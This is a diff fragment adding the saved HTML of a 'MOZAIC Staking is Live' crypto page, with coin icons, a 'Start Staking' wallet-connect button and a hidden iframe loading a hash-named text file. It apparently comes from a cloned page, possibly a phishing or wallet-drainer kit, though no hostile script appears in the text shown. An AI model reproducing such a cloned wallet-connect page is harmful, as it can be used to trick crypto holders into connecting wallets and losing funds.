+                                    class="jsx-ab73bcb2f1575da3 jsx-2220230959 vault-card-container">
+                                    <div class="jsx-ab73bcb2f1575da3 jsx-2220230959 gradient-overlay"></div>
+                                    <div class="jsx-ab73bcb2f1575da3 jsx-2220230959 vault-icon-wrapper"><img
+                                            src="ofQ5WuM6_400x400.png" alt=""
+                                            class="jsx-ab73bcb2f1575da3 jsx-2220230959 vault-icon"></div>
+                                    <section class="jsx-ab73bcb2f1575da3 jsx-2220230959 top">
+                                        <div class="jsx-2796969588 title-wrapper">
+                                            <div class="jsx-2796969588 title">
+                                                <h2 class="jsx-2796969588">MOZAIC Staking is Live</h2>
+                                            </div>
+                                            <div class="jsx-2796969588 coin-wrapper coin-Theseus"><img src="ico.btc.svg"
+                                                    alt="BTC" style="z-index: 10;" data-tooltip-id="BTC"
+                                                    data-tooltip-content="BTC" data-tooltip-place="top"
+                                                    data-tooltip-variant="dark" class="jsx-2796969588 coin">
+                                                <div id="BTC" role="tooltip"
+                                                    class="react-tooltip styles-module_tooltip__mnnfp styles-module_dark__xNqje tooltip react-tooltip__place-top"
+                                                    style="left: 12.4397px; top: 54.0085px;">BTC<div
+                                                        class="react-tooltip-arrow styles-module_arrow__K0L3T"
+                                                        style="left: 19.5px; bottom: -4px;"></div>
+                                                </div><img src="ico.eth.svg" alt="ETH" style="z-index: 10;"
+                                                    data-tooltip-id="ETH" data-tooltip-content="ETH"
+                                                    data-tooltip-place="top" data-tooltip-variant="dark"
+                                                    class="jsx-2796969588 coin"><img src="ico.sol.svg" alt="SOL"
+                                                    style="z-index: 10;" data-tooltip-id="SOL"
+                                                    data-tooltip-content="SOL" data-tooltip-place="top"
+                                                    data-tooltip-variant="dark" class="jsx-2796969588 coin">
+                                                <div id="SOL" role="tooltip"
+                                                    class="react-tooltip styles-module_tooltip__mnnfp styles-module_dark__xNqje tooltip react-tooltip__place-top"
+                                                    style="left: 85.1749px; top: 54.0067px;">SOL<div
+                                                        class="react-tooltip-arrow styles-module_arrow__K0L3T"
+                                                        style="left: 19px; bottom: -4px;"></div>
+                                                </div><img src="ico.arb.svg" alt="ARB" style="z-index: 10;"
+                                                    data-tooltip-id="ARB" data-tooltip-content="ARB"
+                                                    data-tooltip-place="top" data-tooltip-variant="dark"
+                                                    class="jsx-2796969588 coin"><img src="ico.link.svg" alt="LINK"
+                                                    style="z-index: 10;" data-tooltip-id="LINK"
+                                                    data-tooltip-content="LINK" data-tooltip-place="top"
+                                                    data-tooltip-variant="dark" class="jsx-2796969588 coin">
+                                                <div id="LINK" role="tooltip"
+                                                    class="react-tooltip styles-module_tooltip__mnnfp styles-module_dark__xNqje tooltip react-tooltip__place-top"
+                                                    style="left: 156.133px; top: 54.0067px;">LINK<div
+                                                        class="react-tooltip-arrow styles-module_arrow__K0L3T"
+                                                        style="left: 20px; bottom: -4px;"></div>
+                                                </div><img src="ico.uni.svg" alt="UNI" style="z-index: 10;"
+                                                    data-tooltip-id="UNI" data-tooltip-content="UNI"
+                                                    data-tooltip-place="top" data-tooltip-variant="dark"
+                                                    class="jsx-2796969588 coin"><img src="ico.doge.svg" alt="DOGE"
+                                                    style="z-index: 10;" data-tooltip-id="DOGE"
+                                                    data-tooltip-content="DOGE" data-tooltip-place="top"
+                                                    data-tooltip-variant="dark" class="jsx-2796969588 coin"><img
+                                                    src="ico.xrp.svg" alt="XRP" style="z-index: 10;"
+                                                    data-tooltip-id="XRP" data-tooltip-content="XRP"
+                                                    data-tooltip-place="top" data-tooltip-variant="dark"
+                                                    class="jsx-2796969588 coin"><img src="ico.ltc.svg" alt="LTC"
+                                                    style="z-index: 10;" data-tooltip-id="LTC"
+                                                    data-tooltip-content="LTC" data-tooltip-place="top"
+                                                    data-tooltip-variant="dark" class="jsx-2796969588 coin"><img
+                                                    src="ico.usdc.svg" alt="USDC" style="z-index: 10;"
+                                                    data-tooltip-id="USDC" data-tooltip-content="USDC"
+                                                    data-tooltip-place="top" data-tooltip-variant="dark"
+                                                    class="jsx-2796969588 coin">
+                                                <div id="USDC" role="tooltip"
+                                                    class="react-tooltip styles-module_tooltip__mnnfp styles-module_dark__xNqje tooltip react-tooltip__place-top"
+                                                    style="left: 331.531px; top: 53.9944px;">USDC<div
+                                                        class="react-tooltip-arrow styles-module_arrow__K0L3T"
+                                                        style="left: 24.5px; bottom: -4px;"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="jsx-57c757670cf8c4f1 apy-container">
+                                            <h2 class="jsx-57c757670cf8c4f1">Stake $MOZ to receive Revenue Share</h2>
+                                            <div class="jsx-e6f1807156ce6ac7 wallet-btn-container solid"><img
+                                                    src="ico.addWallet.svg" alt=""
+                                                    class="jsx-e6f1807156ce6ac7 network-icon">
+                                                <p id="connect_button" class="jsx-e6f1807156ce6ac7 btn-text">Start Staking</p>
+                                            </div>
+                                        </div>
+                                    </section>
+                                </div>
+                            </div>
+                        </div>
+                    </main>
+                </div>
+            </main>
+        </div>
+    </div>
+    <next-route-announcer>
+        <p aria-live="assertive" id="__next-route-announcer__" role="alert"
+            style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+        </p>
+    </next-route-announcer><wcm-modal
+        data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$2769131944$--></div></div>"></wcm-modal><iframe
+        id="verify-api" src="fbf439452ff4d474cae70b239605515e.txt" style="display: none;"></iframe>
+
+</body>
+
+</html>
